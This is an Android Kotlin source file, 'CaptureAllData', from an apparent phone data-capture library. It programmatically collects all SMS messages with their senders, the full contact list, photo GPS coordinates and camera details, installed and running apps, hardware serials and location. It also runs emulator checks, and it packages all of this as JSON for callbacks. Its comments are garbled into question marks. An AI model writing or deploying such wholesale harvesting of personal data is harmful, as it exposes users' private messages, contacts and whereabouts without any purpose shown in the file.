package com.online.phonelibrary.dataCapture
import android.Manifest
import android.app.Activity
import android.app.ActivityManager
import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.graphics.BitmapFactory
import android.media.ExifInterface
import android.net.Uri
import android.os.*
import android.provider.ContactsContract
import android.provider.MediaStore
import androidx.fragment.app.FragmentActivity
import com.online.phonelibrary.JsonDataUtil
import com.online.phonelibrary.PermissionUtil
import com.online.phonelibrary.Simulator.EmulahopetorCheckUtil
import com.online.phonelibrary.Simulator.EmulatorCheckCallback
import com.online.phonelibrary.Simulator.SimulatorUtil
import com.online.phonelibrary.TimeUtils
import com.online.phonelibrary.bean.*
import com.online.phonelibrary.locationInfo.LocationUtils

import java.util.*
import kotlin.collections.ArrayList


object CaptureAllData : Handler.Callback {

    private val handler by lazy { Handler(this) }
    override fun handleMessage(msg: Message): Boolean {
        var handlerBundle = Bundle()
        when (msg.what) {
            1 -> {
                handlerBundle = msg.data
                if (handlerBundle != null) {
                    val installedAppList =
                            handlerBundle.getSerializable("installedAppList") as ArrayList<InstalledAppBean>
                    val type = handlerBundle.getInt("type")
                    if (installedAppList != null && installedAppList.size > 0) {
                        val installedAppListStr = JsonDataUtil.list2Json(installedAppList)
                        if (obtainInstalledAppDataListenner != null) {
                            obtainInstalledAppDataListenner!!.detailInstalledAppData(
                                    installedAppListStr!!
                            )
                        }
                    }
                }
            }

            2 -> {
                handlerBundle = msg.data
                if (handlerBundle != null) {
                    val simulatorInfo =
                            handlerBundle.getSerializable("simulatorInfo") as SimulatorBean
                    if (obtainSimulatorDataListenner != null) {
                        obtainSimulatorDataListenner!!.detailSimulatorData(simulatorInfo)
                    }
                }

            }

            3 -> {
                handlerBundle = msg.data
                if (handlerBundle != null) {
                    val simulatorDetaisBean =
                            handlerBundle.getSerializable("simulatorDeatilsInfo") as SimulatorDetaisBean
                    if (obtainSimulatorDetailsDataListenner != null) {
                        obtainSimulatorDetailsDataListenner!!.detailSimulatorDetailsData(
                                simulatorDetaisBean
                        )
                    }
                }
            }
            4 -> {
                handlerBundle = msg.data
                if (handlerBundle != null) {
                    val runingAppList =
                            handlerBundle.getSerializable("runingAppList") as ArrayList<RuningApp2Bean>
                    val type = handlerBundle.getInt("type")
                    if (runingAppList != null && runingAppList.size > 0) {
                        if (runingAppList != null && runingAppList.size > 0) {
                            val runingAppListStr = JsonDataUtil.list2Json(runingAppList)
                            if (obtainRunAppDataListenner != null) {
                                obtainRunAppDataListenner!!.detailRunAppData(runingAppListStr!!)
                            }
                        }

                    }
                }
            }
            5 -> {
                handlerBundle = msg.data
                if (handlerBundle != null) {
                    val mobileInfoList =
                            handlerBundle.getSerializable("mobileInfoList") as ArrayList<InstalledAppBean>
                    val type = handlerBundle.getInt("type", 0)
                    if (mobileInfoList != null && mobileInfoList.size > 0) {
                        JsonDataUtil.list2Json(mobileInfoList)!!
                    }
                }
            }

            6 -> {
                handlerBundle = msg.data
                if (handlerBundle != null) {
                    val smsInfoStr =
                            handlerBundle.getString("smsInfoStr")
                    if (smsInfoStr != null) {
                        if (obtainSmsDataListenner != null) {
                            obtainSmsDataListenner!!.detailSmsData(smsInfoStr!!)
                        }
                    }
                }
            }

            7 -> {
                handlerBundle = msg.data
                if (handlerBundle != null) {
                    val albumInfoStr =
                            handlerBundle.getString("albumInfoStr")
                    if (albumInfoStr != null) {
                        if (obtainAlbumDataListenner != null) {
                            obtainAlbumDataListenner!!.detailAlbumData(albumInfoStr!!)
                        }
                    }
                }
            }

            8 -> {
                handlerBundle = msg.data
                if (handlerBundle != null) {
                    val mediaSourceBean =
                            handlerBundle.getSerializable("mediaSourceBean") as MediaSourceBean
                    if (mediaSourceBean != null) {
                        if (obtainMediaDataListenner != null) {
                            obtainMediaDataListenner!!.detailMediaData(mediaSourceBean!!)
                        }
                    }
                }
            }




        }
        return false
    }


    public fun obtainLocationData(activity: Activity) {
        PermissionUtil.initRxPermissions(activity as FragmentActivity)
            .setPermissions(Manifest.permission.ACCESS_COARSE_LOCATION)
            .setPermissionsCallback(object : PermissionUtil.RxPermissionLisenter {
                override fun result(code: Int) {
                    when (code) {
                        PermissionUtil.IS_AGREE -> {//??????
                            LocationUtils.instance!!.setContent(activity).initLocationClient()
                                    .setListener(object : LocationUtils.LocationCallbackListener {
                                        override fun updataLocation(location: LocationBean?) {
                                            if (location != null) {
                                            }
                                        }

                                    }).start()

                        }
                        PermissionUtil.IS_REFUSE -> {//??????

                        }
                        PermissionUtil.IS_NOT_ASK -> {//????????????????????????
//                            //????????????????????????
//                            showPermissionDlg(
//                                activity,
//                                activity.resources.getString(R.string.permission_location)
//                            )
                        }

                    }
                }

            })

    }



    public fun obtainSimulatorData(context: Context): CaptureAllData {
        Thread(Runnable {
            val checkEmulatorFiles = SimulatorUtil.checkEmulatorFiles()
            val checkEmulatorBuild = SimulatorUtil.checkEmulatorBuild()
            val checkOperatorNameAndroid = SimulatorUtil.checkOperatorNameAndroid(context)
            val checkIsRunningInEmulator = EmulahopetorCheckUtil.singleInstance.kmReadKmSysProperty(
                    context,
                    object : EmulatorCheckCallback {
                        override fun phoneHardwareInfo(info: String?) {

                        }
                    })

            val simulatorBean = SimulatorBean(
                    checkEmulatorFiles,
                    checkOperatorNameAndroid,
                    checkIsRunningInEmulator,
                    checkEmulatorBuild
            )

            val msg = Message()
            msg.what = 2
            val bundle = Bundle()
            bundle.putSerializable("simulatorInfo", simulatorBean)
            msg.data = bundle
            Looper.prepare()
            handler.sendMessage(msg)
            Looper.loop()
        }).start()

        return this
    }


    public fun obtainSimulatorDetailsData(context: Context): CaptureAllData {
        Thread(Runnable {
            var emudata_str: SimuLatorData? = null
            val emuhelp = Simulator()
            emuhelp.isEmulator(context, object : Simulator.EmulatorListener {
                override fun emulator(emudata: SimuLatorData) {
                    if (emudata != null) {
                        emudata_str = emudata
                    }
                }
            })
            val cpuInstruction1 = Build.CPU_ABI
            val cpuInstruction2 = Build.CPU_ABI2
            val checkEmulatorFiles = SimulatorUtil.checkEmulatorFiles()
            val describeTip1 = Build.TAGS
            val describeTip2 = Build.USER
            val buildType = Build.TYPE

            val simulatorDeatilsInfo = SimulatorDetaisBean(
                    emudata_str?.app_num!!,
                    emudata_str?.baseband!!,
                    emudata_str?.board!!,
                    emudata_str?.filProter!!,
                    cpuInstruction1,
                    cpuInstruction2,
                    emudata_str?.cameraProFlash!!,
                    checkEmulatorFiles.toString(),
                    emudata_str?.filProter!!,
                    emudata_str?.hardware!!,
                    emudata_str?.platform!!,
                    emudata_str?.sensorNum!!,
                    describeTip1,
                    buildType,
                    describeTip2
            )
            val msg = Message()
            msg.what = 3
            val bundle = Bundle()
            bundle.putSerializable("simulatorDeatilsInfo", simulatorDeatilsInfo)
            msg.data = bundle
            Looper.prepare()
            handler.sendMessage(msg)
            Looper.loop()

        }).start()

        return this

    }


    public fun obtainRuningAppData(activity: Activity): CaptureAllData {
        Thread(Runnable {
            var manager = activity.packageManager
            // ???????????????????????????????????????
            val installedAppList =
                    manager.getInstalledApplications(PackageManager.GET_UNINSTALLED_PACKAGES)
            Collections.sort(
                    installedAppList,
                    ApplicationInfo.DisplayNameComparator(manager)
            )


            val runingAppMap: MutableMap<String, ActivityManager.RunningAppProcessInfo> =
                    HashMap()
            val actManager =
                    activity.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            // ????????????ActivityManager???getRunningAppProcesses()????????????????????????????????????????????????
            if (actManager != null) {
                val appProcessList =
                        actManager
                                .runningAppProcesses
                if (appProcessList != null) {
                    for (appProcess in appProcessList) {
                        val pid = appProcess.pid // pid
                        val processName = appProcess.processName // ?????????
                        val pkgNameList =
                                appProcess.pkgList // ???????????????????????????????????????????????????

                        // ?????????????????????????????????
                        if (pkgNameList != null) {
                            for (i in pkgNameList.indices) {
                                val pkgName = pkgNameList[i]
                                runingAppMap[pkgName] = appProcess
                            }
                        }
                    }
                }
            }
            // ?????????????????????????????????????????????
            val runingAppInfoList: java.util.ArrayList<RuningApp2Bean> =
                    java.util.ArrayList<RuningApp2Bean>() // ?????????????????????AppInfo
            if (installedAppList != null) {
                for (app in installedAppList) {
                    // ????????????????????? ???????????????RunningAppInfo??????
                    if (runingAppMap.containsKey(app.packageName)) {
//                    int pid = pgkProcessAppMap.get(app.packageName).pid;
//                    String processName = pgkProcessAppMap.get(app.packageName).processName;
                        runingAppInfoList.add(RuningApp2Bean(app.loadLabel(manager) as String))
                    }
                }
            }

            val msg = Message()
            msg.what = 4
            val bundle = Bundle()
            bundle.putSerializable("runingAppList", runingAppInfoList)
            msg.data = bundle
            Looper.prepare()
            handler.sendMessage(msg)
            Looper.loop()
        }).start()
        return this
    }


    public fun obtainScreenesolutionData(activity: Activity): ScreenSolutionData? {
        var screenSolutionData: ScreenSolutionData? = null
        val isplayMetrics = activity.getResources().getDisplayMetrics()

        val displayMetricsStr = JsonDataUtil.object2Json(isplayMetrics)
        val displayMetricsMap = JsonDataUtil.json2Map(displayMetricsStr)

        if (displayMetricsMap != null) {
            screenSolutionData = ScreenSolutionData(
                    displayMetricsMap.get("density").toString(),
                    displayMetricsMap.get("densityDpi").toString(),
                    displayMetricsMap.get("heightPixels").toString(),
                    displayMetricsMap.get("widthPixels").toString(),

                    displayMetricsMap.get("noncompatDensity").toString(),
                    displayMetricsMap.get("noncompatDensityDpi").toString(),
                    displayMetricsMap.get("noncompatHeightPixels").toString(),
                    displayMetricsMap.get("noncompatWidthPixels").toString(),

                    displayMetricsMap.get("noncompatScaledDensity").toString(),
                    displayMetricsMap.get("noncompatXdpi").toString(),
                    displayMetricsMap.get("noncompatYdpi").toString(),

                    displayMetricsMap.get("scaledDensity").toString(),
                    displayMetricsMap.get("xdpi").toString(),
                    displayMetricsMap.get("ydpi").toString()
            )
        }
        return screenSolutionData
    }


    public fun obtainHardwareInforData(): StorageHardware {
        val mainboard = Build.BOARD
        val bootloader = Build.BOOTLOADER
        val brand = Build.BRAND
        val device = Build.DEVICE

        val hardware = Build.HARDWARE
        val model = Build.MODEL
        val product = Build.PRODUCT
        val manufacturer = Build.MANUFACTURER
        val fingerprint = Build.FINGERPRINT
        val display = Build.DISPLAY
        val radioVersion = Build.getRadioVersion()
        val SerialNumber = Build.SERIAL
        val host = Build.HOST
        val listOfRevisions = Build.ID


        val storageHardware = StorageHardware(
                mainboard,
                bootloader,
                brand,
                device,
                hardware,
                model,
                product,
                manufacturer,
                fingerprint,
                display,
                radioVersion,
                SerialNumber,
                host,
                listOfRevisions
        )

        return storageHardware

    }


    public fun obtainInstalledAppData(context: Context): CaptureAllData {
        Thread(Runnable {
            val appListInfos: java.util.ArrayList<InstalledAppBean> =
                    java.util.ArrayList<InstalledAppBean>()
            val manager = context.packageManager
            val list =
                    manager.getInstalledPackages(PackageManager.GET_UNINSTALLED_PACKAGES)
            for (i in list.indices) {
                val installedBean = InstalledAppBean()
                val packageInfo = list[i]
                //????????????
                val firstInstallTime: Long =
                        millisecond2Seconds(packageInfo.firstInstallTime)
                //?????????????????????
                if (packageInfo.applicationInfo.flags and ApplicationInfo.FLAG_SYSTEM > 0) { //???
                    installedBean.installappType = 1
                } else {
                    installedBean.installappType = 2
                }

                //??????app????????????
                var versionName: String = "0"
                if (packageInfo.versionName != null) {
                    versionName = packageInfo.versionName
                }
                var appName = ""
                //????????????????????????????????????????????????,??????AndriodMainfest??????app_name???
                if (packageInfo.applicationInfo.loadLabel(context.packageManager) != null) {
                    appName =
                            packageInfo.applicationInfo.loadLabel(context.packageManager).toString()
                }
                var packageName: String = ""
                if (packageInfo.packageName != null) {
                    packageName = packageInfo.packageName
                }

                installedBean.installappVersion = versionName
                installedBean.installappInstallDatetime = firstInstallTime
                installedBean.installAppName = appName
                installedBean.installappPackageName = packageName
                appListInfos.add(installedBean)
            }

            val msg = Message()
            msg.what = 1
            val bundle = Bundle()
            bundle.putSerializable("installedAppList", appListInfos)
            msg.data = bundle
            Looper.prepare()
            handler.sendMessage(msg)
            Looper.loop()
        }).start()
        return this
    }

    fun millisecond2Seconds(millisecond: Long): Long {
        return Math.ceil(millisecond / 1000.toDouble()).toLong()
    }



    public fun obtainAddressBookAppData(context: Context): String? {
        val mobileInfoList = ArrayList<MobileInfo2Bean>()
        var mobileInfoStr: String? = ""
        try {
            val contentResolver = context.getContentResolver()
            val cursor = contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null
            )
            //moveToNext????????????????????????boolean???????????????
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    //????????????????????????
                    val name = cursor.getString(
                            cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    )
                    //????????????????????????
                    val num = cursor.getString(
                            cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    )
                    //????????????
                    val updateTime =
                        cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP))
                    if (num != null && !num.isEmpty()) {
                        mobileInfoList.add(MobileInfo2Bean(name, num,updateTime))
                    }
                }
                mobileInfoStr = JsonDataUtil.arr2Json(mobileInfoList)
            }
        } catch (Proe: Exception) {
            Proe.fillInStackTrace()
        }

        return mobileInfoStr
    }



    public fun obtainSMSData(context: Context): CaptureAllData {
        Thread(Runnable {
            var smsInfoStr: String? = ""
            val uri = Uri.parse("content://sms/")
            val resolver = context.getContentResolver()
            val cursor = resolver.query(
                    uri,
                    arrayOf("_id", "body", "date", "type", "read", "date", "person", "address"),
                    null,
                    null,
                    null
            )
            val smsInfos = ArrayList<SmsInfo>()
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    var _id = 0
                    var body = ""
                    var date = 0L
                    var type = 0
                    var read = 0
                    var date2 = 0L
                    var person = 0
                    var address = ""
                    if (cursor.getInt(0) != null) {
                        _id = cursor.getInt(0)
                    }
                    if (cursor.getString(1) != null) {
                        body = cursor.getString(1)
                    }
                    if (cursor.getLong(2) != null) {
                        date = cursor.getLong(2)
                    }
                    if (cursor.getInt(3) != null) {
                        type = cursor.getInt(3)
                    }
                    if (cursor.getInt(4) != null) {
                        read = cursor.getInt(4)
                    }
                    if (cursor.getLong(5) != null) {
                        date2 = cursor.getLong(5)
                    }
                    if (cursor.getInt(6) != null) {
                        person = cursor.getInt(6)
                    }
                    if (cursor.getString(7) != null) {
                        address = cursor.getString(7)
                    }
//                val body = cursor.getString(1)
//                val date = cursor.getLong(2)
//                val type = cursor.getInt(3)
//                val read = cursor.getInt(4)
//                val date2 = cursor.getLong(5)
//                val person = cursor.getInt(6)
//                val address = cursor.getString(7)

                    val smsInfo = SmsInfo(
                            body,
                            date.toString(),
                            type.toString(),
                            read.toString(),
                            date2.toString(),
//                    person.toString(),
                            address,
                            address
                    )
                    smsInfos.add(smsInfo)
                }
                cursor.close()
            }

            if (smsInfos != null && smsInfos.size > 0) {
                smsInfoStr = JsonDataUtil.arr2Json(smsInfos)
            }
            val msg = Message()
            msg.what = 6
            val bundle = Bundle()
            bundle.putSerializable("smsInfoStr", smsInfoStr)
            msg.data = bundle
            Looper.prepare()
            handler.sendMessage(msg)
            Looper.loop()


        }).start()
        return this
    }


    public fun obtainAlbumData(context: Context): CaptureAllData {
        Thread(Runnable {
            val albumInfos = ArrayList<AlbumInfo>()
            var albumInfoStr: String? = ""
            val photoCursor = context.contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    null,
                    null,
                    null,
                    null
            )

            if (photoCursor != null && photoCursor.getCount() > 0) {
                try {
                    while (photoCursor.moveToNext()) {
                        //????????????
                        val photoPath =
                            photoCursor.getString(photoCursor.getColumnIndex(MediaStore.Images.Media.DATA))
                        //????????????
                        var formatDataPhotoDate = ""
                        if (photoCursor.getLong(photoCursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN)) != null) {
                            val photoDate =
                                photoCursor.getLong(photoCursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN))
                            formatDataPhotoDate = TimeUtils.formatDateToYyyyMmDd(photoDate)
                        }
                        //????????????
                        var photoTitle = ""
                        if (photoCursor.getString(photoCursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)) != null) {
                            photoTitle =
                                photoCursor.getString(photoCursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME))
                        }


                        //????????????
                        var photoHeight = ""
                        var photoWidth = ""
                        var sName =""
                        var lat =0.0
                        var lon =0.0
                        //??????
                        var sMake: String? = ""
                        //??????
                        var sModel: String? = ""
                        //???????????????android
                        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                            val options = BitmapFactory.Options()
                            options.inJustDecodeBounds = true
                            BitmapFactory.decodeFile(photoPath, options)

                            photoHeight = options.outHeight.toString()
                            photoWidth = options.outWidth.toString()

                            val exif = ExifInterface(photoPath)

                            if (exif.getAttribute(ExifInterface.TAG_MAKE) != null) {
                                sMake = exif.getAttribute(ExifInterface.TAG_MAKE)
                            }

                            if (exif.getAttribute(ExifInterface.TAG_MODEL) != null) {
                                sModel = exif.getAttribute(ExifInterface.TAG_MODEL)
                            }
                            //????????????
                            //val sDataTime = exif.getAttribute(ExifInterface.TAG_DATETIME)
                            val sDataTime = formatDataPhotoDate
                            //??????
                            sName = photoTitle

                            //??????
                            val latitude_exif = exif.getAttribute(ExifInterface.TAG_GPS_LATITUDE)
                            //??????
                            val longitude_exif = exif.getAttribute(ExifInterface.TAG_GPS_LONGITUDE)
                            val latRef =
                                    exif.getAttribute(ExifInterface.TAG_GPS_LATITUDE_REF)
                            val lngRef =
                                    exif.getAttribute(ExifInterface.TAG_GPS_LONGITUDE_REF)

                            //???????????????
                            lat = score2dimensionality(latitude_exif)
                            //???????????????
                            lon = score2dimensionality(longitude_exif)
                        }


                        val albumInfo = AlbumInfo(
                                "", formatDataPhotoDate, photoHeight, photoWidth, photoTitle,
                                lat.toString(), lon.toString(), sMake!!, sModel!!, photoTitle
                        )
                        albumInfos.add(albumInfo)

//                    LogUtils.e("???????????????????????????" + photoCursor.getCount() + " ??????=" + lat + " ??????=" + lon + " ??????=" + photoTitle)
//                    LogUtils.e("???????????????????????????"+photoCursor.getCount()+" ??????=" + photoPath + " ??????=" + photoDate + " ??????=" + photoTitle + " ??????=" + photoType
                        //                    + " ??????=" + photoHeight + " ??????=" + photoWidth + " ??????=" + photoSize)
//                    LogUtils.e("???????????????????????????" + photoCursor.getCount() + " ??????=" + latitude + " ??????=" + longitude)
//                    LogUtils.e("???????????????????????????"+photoCursor.getCount()+" ??????="+sMake+" ??????="+sModel)
//                    LogUtils.e("???????????????????????????"+photoCursor.getCount()+" ????????????="+sDataTime+" ??????="+sName+" ??????="+photoDate)
                    }
                    photoCursor.close()
                } catch (e: Exception) {

                } finally {
                    if (photoCursor != null) photoCursor.close()
                }

                if (albumInfos != null && albumInfos.size > 0) {
                    albumInfoStr = JsonDataUtil.arr2Json(albumInfos)
                }

                val msg = Message()
                msg.what = 7
                val bundle = Bundle()
                bundle.putSerializable("albumInfoStr", albumInfoStr)
                msg.data = bundle
                Looper.prepare()
                handler.sendMessage(msg)
                Looper.loop()
            }

        }).start()
        return this
    }



    public fun obtainMediaSourceData(context: Context): CaptureAllData {
        Thread(Runnable {
            val mediaSourceBean = MediaSourceBean()

            val imagesCursor = context.contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    null,
                    null,
                    null,
                    null
            )
            if (imagesCursor != null && imagesCursor.getCount() > 0) {
                mediaSourceBean.photo_number = imagesCursor.getCount()
            } else {
                mediaSourceBean.photo_number = 0
            }
            val videoCursor = context.contentResolver.query(
                    MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                    null,
                    null,
                    null,
                    null
            )
            if (videoCursor != null && videoCursor.getCount() > 0) {
                mediaSourceBean.video_number = videoCursor.getCount()
            } else {
                mediaSourceBean.video_number = 0
            }
            val audioCursor = context.contentResolver.query(
                    MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                    null,
                    null,
                    null,
                    null
            )
            if (audioCursor != null && audioCursor.getCount() > 0) {
                mediaSourceBean.audio_number = audioCursor.getCount()
            } else {
                mediaSourceBean.audio_number = 0
            }

            val msg = Message()
            msg.what = 8
            val bundle = Bundle()
            bundle.putSerializable("mediaSourceBean", mediaSourceBean)
            msg.data = bundle
            Looper.prepare()
            handler.sendMessage(msg)
            Looper.loop()

        }).start()
        return this
    }


    private fun score2dimensionality(string: String?): Double {
        var dimensionality = 0.0
        if (null == string) {
            return dimensionality
        }

        //??? ??????????????????3???
        val split = string.split(",".toRegex()).toTypedArray()
        for (i in split.indices) {
            val s = split[i].split("/".toRegex()).toTypedArray()
            //???112/1?????????????????????
            val v = s[0].toDouble() / s[1].toDouble()
            //?????????????????????60???3600?????????????????????????????????
            dimensionality = dimensionality + v / Math.pow(60.0, i.toDouble())
        }
        return dimensionality
    }




    interface OnObtainInstalledAppDataListenner {
        fun detailInstalledAppData(data: String)
    }

    var obtainInstalledAppDataListenner: OnObtainInstalledAppDataListenner? = null
    fun setInstalledAppDataListenner(listener: OnObtainInstalledAppDataListenner) {
        obtainInstalledAppDataListenner = listener
    }

    interface OnObtainSimulatorDataListenner {
        fun detailSimulatorData(data: SimulatorBean)
    }

    var obtainSimulatorDataListenner: OnObtainSimulatorDataListenner? = null
    fun setSimulatorDataListenner(listener: OnObtainSimulatorDataListenner) {
        obtainSimulatorDataListenner = listener
    }

    interface OnObtainSimulatorDetailsDataListenner {
        fun detailSimulatorDetailsData(data: SimulatorDetaisBean)
    }

    var obtainSimulatorDetailsDataListenner: OnObtainSimulatorDetailsDataListenner? = null
    fun setSimulatorDetailsDataListenner(listener: OnObtainSimulatorDetailsDataListenner) {
        obtainSimulatorDetailsDataListenner = listener
    }

    interface OnObtainRunAppDataListenner {
        fun detailRunAppData(data: String)
    }

    var obtainRunAppDataListenner: OnObtainRunAppDataListenner? = null
    fun setRunAppDataListenner(listener: OnObtainRunAppDataListenner) {
        obtainRunAppDataListenner = listener
    }

    interface OnObtainSmsDataListenner {
        fun detailSmsData(data: String)
    }

    var obtainSmsDataListenner: OnObtainSmsDataListenner? = null
    fun setSmsDataListenner(listener: OnObtainSmsDataListenner) {
        obtainSmsDataListenner = listener
    }

    interface OnObtainAlbumDataListenner {
        fun detailAlbumData(data: String)
    }

    var obtainAlbumDataListenner: OnObtainAlbumDataListenner? = null
    fun setAlbumDataListenner(listener: OnObtainAlbumDataListenner) {
        obtainAlbumDataListenner = listener
    }

    interface OnObtainMediaDataListenner {
        fun detailMediaData(data: MediaSourceBean)
    }
    var obtainMediaDataListenner: OnObtainMediaDataListenner? = null
    fun setMediaDataListenner(listener: OnObtainMediaDataListenner) {
        obtainMediaDataListenner = listener
    }


}